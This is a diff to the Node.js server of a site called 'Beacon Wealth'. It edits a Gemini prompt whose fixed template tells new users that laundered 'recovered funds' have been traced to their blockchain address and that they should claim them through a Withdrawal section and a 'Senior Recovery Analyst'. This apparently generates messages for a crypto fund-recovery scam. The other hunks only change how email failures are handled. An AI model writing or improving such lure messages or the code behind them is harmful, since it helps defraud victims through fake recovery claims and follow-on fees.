@@ -55,7 +55,7 @@ async function createUniqueWelcomeMessage(username) {
   try {
     const response = await gemini.models.generateContent({
       model: 'gemini-2.0-flash',
-      contents: `Write one , friendly account welcome message for ${username}. Mention that the account was created on ${registrationDate}. Keep it under 45 words. mention money, balances, investments, recovery, fees, compliance, taxes, guarantees, or urgency. Return only the message text. use this format: "Welcome to Beacon Wealth, ${username}. Your account was created on ${registrationDate}. The recovered funds were traced across multiple blockchain platforms and. Our system successfully linked all associated investments to a secured account connected to your blockchain address, the recovered assets became commingled with funds involved in laundering and trafficking activities, all of which were subsequently traced and linked to your blockchain address. As a result, ownership of the recovered balance has been attributed to your account. Please proceed to the Withdrawal section to initiate your claim. For any additional inquiries or assistance, kindly contact Senior Recovery Analyst."`
+      contents: `Write one , account welcome message for ${username}. Mention that the account was created on ${registrationDate}. Keep it under 300 words. mention money, balances, investments, recovery, fees, compliance, taxes, guarantees, or urgency. Return only the message text. use this format: "Welcome to Beacon Wealth, ${username}. Your account was created on ${registrationDate}. The recovered funds were traced across multiple blockchain platforms and. Our system successfully linked all associated investments to a secured account connected to your blockchain address, the recovered assets became commingled with funds involved in laundering and trafficking activities, all of which were subsequently traced and linked to your blockchain address. As a result, ownership of the recovered balance has been attributed to your account. Please proceed to the Withdrawal section to initiate your claim. For any additional inquiries or assistance, kindly contact Senior Recovery Analyst."`
     });
     const generated = response.text?.trim().replace(/[\r\n]+/g, ' ');
     if (!generated || generated.length > 300) return fallback;
@@ -88,8 +88,12 @@ const transporter = nodemailer.createTransport({
     pass: process.env.SMTP_PASSWORD
   }
 });
+const smtpConfigured = Boolean(process.env.SMTP_USER && process.env.SMTP_PASSWORD);
 
 function sendEmail(to, subject, html) {
+  if (!smtpConfigured) {
+    throw new Error('SMTP_USER and SMTP_PASSWORD are not configured.');
+  }
   return transporter.sendMail({
     from: `"Beacon Wealth Security" <${transporter.options.auth.user}>`,
     to,
@@ -182,7 +186,8 @@ app.post('/api/login', async (req, res) => {
       await sendEmail(user.email, 'Your 4-Digit Beacon Wealth Verification Code', mailHtml);
       return res.status(200).json({ message: 'Code sent to email.', email: user.email, username: user.username });
     } catch (emailError) {
-      return res.status(200).json({ message: 'Login successful (Fallback code generated).', email: user.email, username: user.username });
+      console.error('Login verification email failed:', emailError.message);
+      return res.status(503).json({ error: 'Verification email is not configured or could not be delivered.' });
     }
   } catch (error) {
     return res.status(500).json({ error: 'Server authentication error.' });
@@ -272,7 +277,8 @@ app.post('/api/forgot-password', async (req, res) => {
       await sendEmail(email, 'Password Reset Recovery Code', mailHtml);
       return res.status(200).json({ message: 'Recovery code emailed.' });
     } catch (emailError) {
-      return res.status(200).json({ message: 'Code processed (Fallback code generated).' });
+      console.error('Password recovery email failed:', emailError.message);
+      return res.status(503).json({ error: 'Recovery email is not configured or could not be delivered.' });
     }
   } catch (err) {
     return res.status(500).json({ error: 'Server recovery processing error.' });
@@ -313,7 +319,8 @@ app.post('/api/resend-code', async (req, res) => {
       await sendEmail(email, 'Your New Beacon Wealth Verification Code', mailHtml);
       return res.status(200).json({ message: 'Verification code resent.' });
     } catch (emailError) {
-      return res.status(200).json({ message: 'New code generated (Fallback code generated).' });
+      console.error('Verification resend email failed:', emailError.message);
+      return res.status(503).json({ error: 'Verification email is not configured or could not be delivered.' });
     }
   } catch (err) {
     return res.status(500).json({ error: 'Server error processing resend.' });
